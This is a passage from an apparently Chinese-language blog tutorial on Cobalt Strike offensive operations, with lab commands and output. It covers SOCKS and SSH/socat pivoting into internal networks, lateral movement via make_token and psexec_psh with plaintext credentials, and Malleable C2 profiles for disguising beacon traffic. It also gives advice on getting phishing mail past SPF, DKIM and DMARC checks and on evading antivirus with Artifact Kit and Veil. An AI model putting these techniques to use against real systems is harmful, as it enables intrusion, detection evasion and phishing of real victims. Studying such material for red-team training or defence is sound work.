进行代理转发</strong></p><p>使用 ProxyChains 可以使我们为没有代理配置功能的软件强制使用代理</p><ol><li>和上一节中介绍的一致，开启一个 socks 代理服务</li><li>配置 <code>/etc/proxychains.conf</code> 文件</li><li>运行 <code>proxychains + 待执行命令</code></li></ol><p>接下来继续上一节中的演示环境：</p><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0&#x2F;24 地址段</p></blockquote><p>1、设置 socks 代理</p><p>首先开启交互模式，之后开启 socks 代理</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep 0</span><br><span class="line">socks 9527</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">sleep</span> <span class="number">0</span></span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br><span class="line">beacon&gt; socks <span class="number">9527</span></span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br><span class="line">[+] started SOCKS4a server on: <span class="number">9527</span></span><br></pre></td></tr></table></figure><p>2、配置 ProxyChains</p><p>在攻击机上，配置 <code>/etc/proxychains.conf</code> 文件的最后一行，根据当前攻击主机 IP 与设置的 Socks 端口，修改如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 192.168.175.200 9527</span><br></pre></td></tr></table></figure><p>3、开始使用 ProxyChains</p><p>根据上一节使用 Metasploit 的扫描可以知道，在 192.168.232.0&#x2F;24 地址段中存在主机 192.168.232.132 ，接下来使用 nmap 扫描一下常见的端口，这里以 80,443,445,3389 作为演示。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389</span><br></pre></td></tr></table></figure><blockquote><p>-sT：使用 TCP 扫描</p><p>-Pn：不使用 Ping</p><p>-p：指定扫描端口</p><p>注：不加上 -sT -Pn 参数，将无法使用 proxychains 进行代理扫描</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; proxychains nmap <span class="literal">-sT</span> <span class="literal">-Pn</span> <span class="number">192.168</span>.<span class="number">232.132</span> <span class="literal">-p</span> <span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">3389</span>                       </span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.14</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09-07</span> <span class="number">23</span>:<span class="number">05</span> EDT</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">80</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">3389</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">443</span> &lt;<span class="literal">--denied</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">Host is up (<span class="number">0.19</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   open   http</span><br><span class="line"><span class="number">443</span>/tcp  closed https</span><br><span class="line"><span class="number">445</span>/tcp  open   microsoft<span class="literal">-ds</span></span><br><span class="line"><span class="number">3389</span>/tcp open   ms<span class="literal">-wbt-server</span></span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">14.35</span> seconds</span><br></pre></td></tr></table></figure><p>通过扫描可以看到目标 80 端口是开放的，接下来使用 curl 作为对比示例。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.232.132</span><br><span class="line">proxychains curl 192.168.232.132</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">curl</span> <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line"><span class="built_in">curl</span>: (<span class="number">7</span>) Failed to connect to <span class="number">192.168</span>.<span class="number">232.132</span> port <span class="number">80</span>: No route to host</span><br><span class="line"></span><br><span class="line">&gt; proxychains <span class="built_in">curl</span> <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.14</span></span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>  ...  <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">80</span>  ...  OK</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http<span class="literal">-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=iso-8859-1&quot;</span> /&gt;</span><br><span class="line">……内容太多，此处省略……                 </span><br></pre></td></tr></table></figure><h6 id="2、反向转发"><a href="#2、反向转发" class="headerlink" title="2、反向转发"></a>2、反向转发</h6><p>反向转发顾名思义就是和上一节中提到的转发路径相反，之前我们设置的代理是 <code>CS服务端 --&gt; 上线主机 --&gt; 内网主机</code>，反向转发则是 &#96;内网主机 –&gt; 上线主机 –&gt; CS服务端</p><p>继续使用上面的演示环境，首先右击上线主机会话，选择 <code>Pivoting --&gt; Listener</code> ，除了 Name 选项之外，CS 都会自动配置好，这里直接使用默认的配置信息</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112161902771.png" alt="image-20230112161902771"></p><p>之后生成一个 Windows 可执行文件，选择上一步生成的监听器，如果目标是 64 位则勾选使用 x64 Payload 的选项，然后将该可执行文件在目标主机上执行即可，在现实环境中可以尝试使用钓鱼邮件的方式诱导目标执行。当目标执行该文件后，就会发现当前不出网的 192.168.232.132 主机已经上线了</p><h6 id="3、通过-SSH-开通通道"><a href="#3、通过-SSH-开通通道" class="headerlink" title="3、通过 SSH 开通通道"></a>3、通过 SSH 开通通道</h6><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163229400.png" alt="image-20230112163229400" style="zoom: 40%;" /><p>1、连接到上图中蓝色区域里的 PIVOT 主机并开启端口转发</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@&lt;blue pivot&gt;</span><br></pre></td></tr></table></figure><blockquote><p>该命令中的 -D 参数会使 SSH 建立一个 socket，并去监听本地的 1080 端口，一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，随后发往远程主机。</p></blockquote><p>2、在红色区域的 PIVOT 主机上开启通过 SSH Socks 的 445 端口转发</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:&lt;target&gt;:445</span><br></pre></td></tr></table></figure><blockquote><p>socat 可以理解成 netcat 的加强版。socat 建立 socks 连接默认端口就是 1080 ，由于我们上面设置的就是 1080，因此这里不需变动。如果设置了其他端口，那么这里还需要在命令最后加上 <code>,socksport=&lt;port&gt;</code> 指定端口才行。</p></blockquote><p>3、在攻击者控制的主机上运行 beacon，使其上线</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意需要使用 administrator 权限运行 beacon</span><br></pre></td></tr></table></figure><p>4、在上线的主机上运行以下命令</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make_token [DOMAIN\user] [password]</span><br><span class="line">jump psexec_psh &lt;red pivot&gt; [listener]</span><br></pre></td></tr></table></figure><p>整体的流程就是下面这张图一样</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163300316.png" alt="image-20230112163300316" style="zoom:50%;" /><p><strong>示例</strong></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163315027.png" alt="image-20230112163315027" style="zoom:50%;" /><ol><li>首先使 Win1 主机上线，接着在 Linux1 主机上通过 SSH 连接到 Linux2 主机。</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@192.168.175.146</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; ssh -D 1080 user@192.168.175.146</span><br><span class="line">user@192.168.175.146&#x27;s password: </span><br><span class="line">Last login: Fri Jul 31 20:00:54 2020 from 192.168.175.1</span><br><span class="line">user@ubuntu:~$ </span><br></pre></td></tr></table></figure><p>2、在 Linux1 主机上开启 445 端口转发</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445</span><br></pre></td></tr></table></figure><p>3、在 Win1 主机上运行以下命令使 Win2 上线</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make_token teamssix\administrator Test123!</span><br><span class="line">jump psexec_psh 192.168.175.200 smb</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; make_token teamssix\administrator Test123!</span><br><span class="line">[*] Tasked beacon to create a token <span class="keyword">for</span> teamssix\administrator</span><br><span class="line">[+] host called home, sent: <span class="number">61</span> bytes</span><br><span class="line">[+] Impersonated WINTEST\Administrator</span><br><span class="line"></span><br><span class="line">beacon&gt; jump psexec_psh <span class="number">192.168</span>.<span class="number">175.200</span> smb</span><br><span class="line">[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_532c) on <span class="number">192.168</span>.<span class="number">175.200</span> via Service Control Manager (PSH)</span><br><span class="line">[+] host called home, sent: <span class="number">5886</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Started service <span class="number">4</span>aea3b9 on <span class="number">192.168</span>.<span class="number">175.200</span></span><br><span class="line">[+] host called home, sent: <span class="number">204473</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">232.132</span></span><br></pre></td></tr></table></figure><p>4、随后便可以看到通过 SSH 上线的主机</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230112163445549.png" alt="image-20230112163445549" style="zoom:50%;" /><h5 id="malleable-命令和控制"><a href="#malleable-命令和控制" class="headerlink" title="malleable 命令和控制"></a>malleable 命令和控制</h5><p>malleable 是一种针对特定领域的语言，主要用来控制 Cobalt Strike Beacon</p><p>在开启 teamserver 时，在其命令后指定配置文件即可调用，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [ip address] [password] [profile]</span><br></pre></td></tr></table></figure><p><strong>编写配置文件</strong></p><p>1、定义事务指标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"># 指标</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line"># 指标</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、控制客户端和服务端指标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">client &#123;</span><br><span class="line"># 指标</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line"># 指标</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、set 操作</p><p>set 语句是给一个选项赋值的方法，以分号结束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)&quot;;</span><br></pre></td></tr></table></figure><p>malleable 给了我们很多选项，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jitter# 控制 beacon 默认回连的抖动因子</span><br><span class="line">maxdns# 控制最大 DNS 请求，限制最大数量可以使 DNS Beacon 发送数据看起来正常些</span><br><span class="line">sleeptime# 控制 beacon 的全部睡眠时间</span><br><span class="line">spawnto</span><br><span class="line">uri</span><br><span class="line">useragent# 控制每次发送请求的 useragent</span><br></pre></td></tr></table></figure><p><code>sleeptime</code> 和 <code>jitter</code> 两个选项是很重要的</p><p>添加任意 headers</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">header &quot;Accept&quot; &quot;text/html,application/xhtml&quot;;</span><br><span class="line">header &quot;Referer&quot; &quot;https://www.google.com&quot;;</span><br><span class="line">header &quot;Progma&quot; &quot;no-cache&quot;;</span><br><span class="line">header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br></pre></td></tr></table></figure><p>其他指标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header &quot;header&quot; &quot;value&quot;;</span><br><span class="line">parameter &quot;key&quot; &quot;value&quot;;</span><br></pre></td></tr></table></figure><p>转换&#x2F;存储数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">metadata &#123;</span><br><span class="line">    netbios;</span><br><span class="line">    append &quot;-.jpg&quot;;</span><br><span class="line">    uri-append;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cs23-1.png" alt="img" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs23-2.png" alt="img" style="zoom:67%;" /><p>数据转换语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">append &quot;string&quot;</span><br><span class="line">base64</span><br><span class="line">netbios</span><br><span class="line">netbiosu</span><br><span class="line">prepend &quot;string&quot;</span><br></pre></td></tr></table></figure><p>在GitHub 上有一些配置文件的示例，项目地址：<a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>这一节将使用该项目中的 <code>Malleable-C2-Profiles/APT/havex.profile</code> 配置文件作为示例</p><p><strong>测试配置文件是否有效</strong></p><p>可以使用 c2lint 工具对配置文件进行测试，以判断配置文件编写的是否有效。</p><p>来到 cobalt strike 目录下，可以看到有一个 c2lint 文件，该文件需要在 Linux 下运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint [profile]</span><br></pre></td></tr></table></figure><p>在运行的结果中，绿色正常（这里更像青色），黄色告警，红色错误，比如运行 <code>Malleable-C2-Profiles</code> 项目里的 <code>havex.profile</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint ./Malleable-C2-Profiles/APT/havex.profile</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs24-1.png" alt="img"></p><p>当配置文件存在错误的时候，就会以红色显示出来</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs24-2.png" alt="img"></p><p><strong>运行 teamserver</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [teamserver_ip] [teamserver_password] [profile]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./teamserver 192.168.12.2 password ./Malleable-C2-Profiles/APT/havex.profile</span><br><span class="line">[*] Will use existing X509 certificate and keystore (for SSL)</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">[+] I see you&#x27;re into threat replication. ./Malleable-C2-Profiles/APT/havex.profile loaded.</span><br><span class="line">[+] Team server is up on 50050</span><br></pre></td></tr></table></figure><p>这里调用的 havex.profile 配置文件，该配置文件里对 cookie 进行了 base64 编码</p><p>开启 cobalt strike 后，使主机上线，通过 wireshark 抓包可以发现数据包确实符合这些特征。</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/cs24-3.png" alt="img"></p><h5 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h5><p>Cobalt Strike 不是什么工作情况都能胜任的工具，因此就需要我们根据不同的情况去做一些辅助工作</p><h6 id="1、DKIM、SPF-和-DMARC"><a href="#1、DKIM、SPF-和-DMARC" class="headerlink" title="1、DKIM、SPF 和 DMARC"></a><strong>1、DKIM、SPF 和 DMARC</strong></h6><p>SPF、DKIM、DMARC 都是邮件用于帮助识别垃圾信息的附加组件，那么作为一个攻击者，在发送钓鱼邮件的时候，就需要使自己的邮件能够满足这些组件的标准，或者发送到未配置这些组件的域</p><p>在理解这些防御标准前，需要先理解如何在因特网上通过 SMTP 发送邮件</p><p><strong>SMTP</strong></p><p>发送一封邮件的过程大概是下面这个样子，这里以QQ邮箱为例。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet smtp.qq.com 25</span><br><span class="line">HELO teamssix</span><br><span class="line">auth login</span><br><span class="line">base64编码后的邮箱名</span><br><span class="line">base64编码后的授权码</span><br><span class="line">MAIL FROM: &lt;evil_teamssix@qq.com&gt;</span><br><span class="line">RCPT TO: &lt;target_teamssix@qq.com&gt;</span><br><span class="line">DATA</span><br><span class="line">邮件内容</span><br><span class="line">.</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure><p><strong>防御策略</strong></p><p><strong>DKIM</strong></p><p>DKIM <code>DomainKeys Identified Mail</code> 域名密钥识别邮件，DKIM 是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p><p>邮件接收方接收邮件时，会通过 DNS 查询获得公钥，验证邮件 DKIM 签名的有效性，从而判断邮件是否被篡改。</p><p><strong>SPF</strong></p><p>SPF <code>Sender Policy Framework</code> 发送人策略框架，SPF 主要用来防止随意伪造发件人。其做法就是设置一个 SPF 记录，SPF 记录实际上就是 DNS 的 TXT 记录。如果邮件服务器收到一封来自 IP 不在 SPF 记录里的邮件则会退信或者标记为垃圾邮件。</p><p>我们可以使用以下命令查看目标的 SPF 记录  dig +short TXT target.com</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dig +short TXT qq.com</span><br><span class="line">&quot;v=spf1 include:spf.mail.qq.com -all&quot;</span><br></pre></td></tr></table></figure><p>上面的 <code>include:spf.mail.qq.com</code> 表示引入<code>spf.mail.qq.com</code>域名下的 SPF 记录。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dig +short TXT spf-a.mail.qq.com</span><br><span class="line">&quot;v=spf1 ip4:203.205.251.0/24 ip4:103.7.29.0/24 ip4:59.36.129.0/24 ip4:113.108.23.0/24 ip4:113.108.11.0/24 ip4:119.147.193.0/24 ip4:119.147.194.0/24 ip4:59.78.209.0/24 ip4:113.96.223.0/24 ip4:183.3.226.0/24 ip4:183.3.255.0/24 ip4:59.36.132.0/24 -all&quot;</span><br></pre></td></tr></table></figure><p>上面的 <code>ip4:203.205.251.0/24 ip4:103.7.29.0/24</code> 表示只允许这个范围内的 IP 发送邮件。</p><p><strong>DMARC</strong></p><p>DMARC <code>Domain-based Message Authentication, Reporting &amp; Conformance</code> 基于域的消息认证，报告和一致性。</p><p>它用来检查一封电子邮件是否来自所声称的发送者。DMARC 建立在 SPF 和 DKIM 协议上, 并且添加了域名对齐检查和报告发送功能。这样可以改善域名免受钓鱼攻击的保护。</p><p>可以使用下面的命令查看目标的的 DMARC 记录  dig +short TXT _dmarc.target.com</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dig +short TXT _dmarc.qq.com</span><br><span class="line">&quot;v=DMARC1; p=none; rua=mailto:mailauth-reports@qq.com&quot;</span><br></pre></td></tr></table></figure><p>也有一些在线网站支持检测 SPF、DKIM、DMARC 的记录，比如 <a href="https://dmarcly.com/tools/">https://dmarcly.com/tools</a></p><p><strong>发送钓鱼邮件的一些注意事项</strong></p><p>1、检测目标是否有 SPF 记录，如果有则可能会被拦截</p><p>2、检测目标 DMARC 记录的 p 选项是否为 reject ，如果有则可能会被拒绝</p><p>3、模板中嵌入的 URL 地址，不要使用 IP 地址，要保证使用完整的 URL地址</p><p>4、邮件的附件中不能附上一些可执行文件，比如 exe 格式的文件，因为一些邮件过滤器可能会将这些可执行文件删除</p><h6 id="2、杀毒软件"><a href="#2、杀毒软件" class="headerlink" title="2、杀毒软件"></a><strong>2、杀毒软件</strong></h6><p>常规杀毒软件的目的就是发现已知病毒并中止删除它，而作为攻击者则需要对病毒文件进行免杀处理，从而使杀毒软件认为我们的文件是合法文件</p><p><strong>杀软受到的限制</strong></p><p>1、杀毒软件不能把可疑文件删除或者结束运行，否则用户的正常操作可能就会受到影响，同时也会对杀毒软件公司的声誉、口碑产生影响。</p><p>2、杀毒软件不能占用太多的系统资源，否则用户可能会考虑卸载杀毒软件。</p><p>3、大多数杀毒软件的一个弱点就是只会在浏览器下载文件或者文件被写入磁盘时才会检查这个文件的特征码，也就是说在这种情况下才会检查文件是否是病毒。</p><p><strong>如何工作</strong></p><p>1、在大多数杀毒软件背后都会有一个已知病毒的签名数据库，通过将当前文件的特征码与病毒签名数据库进行比对，如果一致则说明该文件是病毒。</p><p>2、同时一些杀毒软件也会去发现用户的一些可疑行为，而且杀毒软件对这种可疑行为的判定会下比较大的功夫。因为如果误杀，造成的后果可能对用户来说是比较严重的。</p><p>3、一些杀毒软件会在沙箱环境中去运行可疑文件，然后根据该可疑文件的行为判断是否为病毒。</p><p><strong>如何免杀</strong></p><p>首先要判断目标使用了哪款杀毒软件，然后自己在虚拟机中去尝试绕过它。其次可以使用 Cobalt Strike 的 Artifact Kit 组件制作免杀可执行文件</p><p><strong>Artifact Kit</strong></p><p>Artifact Kit 是一个制作免杀 EXE、DLL 和 Service EXE 的源代码框架, 在 Cobalt Strike 的 <code>Help--&gt;Arsenal</code>处可下载Artifact Kit</p><p>Artifact Kit 的工作原理大概如下：</p><p>1、将病毒文件进行混淆处理，使杀毒软件将其判定为可疑文件而不是病毒文件。这种混淆可以逃避那些使用简单字符串搜索来识别恶意代码的杀毒软件</p><p>2、对病毒文件进行一些处理，以绕过沙箱检测。比如 Artifact Kit 中的 src-common&#x2F;bypass-pipe.c 会生成可执行文件和DLL，它们通过命名管道为自己提供shellcode。如果防病毒沙箱不能模拟命名管道，它将找不到已知的恶意 shellcode</p><p>Artifact Kit 的使用步骤大概如下：</p><p>1、下载 Artifact Kit</p><p>2、如果需要的话就修改&#x2F;混淆病毒文件</p><p>3、构建</p><p>4、使用 Artifact Kit 加载脚本</p><p>首先来看看未进行免杀处理的效果，这里采用 <a href="https://www.virustotal.com/">virustotal </a>进行检测，发现被 42 个引擎检测到</p><p>接下来就试试 Artifact Kit 进行免杀的效果，Github 项目地址：<a href="https://github.com/Cliov/Arsenal">https://github.com/Cliov/Arsenal</a></p><p>这里使用 Artifact Kit 中的 dist-peek 方法进行测试：</p><p>Cobalt Strike -&gt; Script Manager<code>，Load 加载 </code>&#x2F;Arsenal&#x2F;artifact&#x2F;dist-peek&#x2F;artifact.cna<code>插件，之后在</code>Attacks -&gt; Packages -&gt; Windows Executable&#96; 中生成木马文件</p><p>使用 virustotal 检测仅有 8 个引擎检测到</p><p>把每个杀软的病毒库升级到最新后，实测可以过腾讯电脑管家、火绒，但 360 安全卫士 、 360 杀毒不行</p><p><strong>Veil Evasion</strong> </p><p>此外，也可以使用 Veil Evasion 框架，Veil Evasion 的安装也是比较简单的，Veil-Evasion 在 Kali 2020以前是自带的，但 Kali 2020 中是需要独立安装的。在 Kali 中可以直接使用 apt-get 进行安装。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure><p>其他系统可以使用 veil-evasion 项目中的介绍进行安装，项目地址：<a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>由于 Veil Evasion 有 200 多 M ，因此建议挂上代理进行下载安装</p><p>安装完成之后，在 Cobalt Strike 里的 <code>Attacks -&gt; Packages -&gt; Payload Generator</code> 中选择 Veil 输出生成一个 payload.txt 文件</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230114165534901.png" alt="image-20230114165534901" style="zoom:50%;" /><p>随后来到 Kali 下，输入 <code>veil</code> 启动，输入 <code>use Evasion</code> 使用 Evasion 工具，<code>list</code> 查看当前可用的 Payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 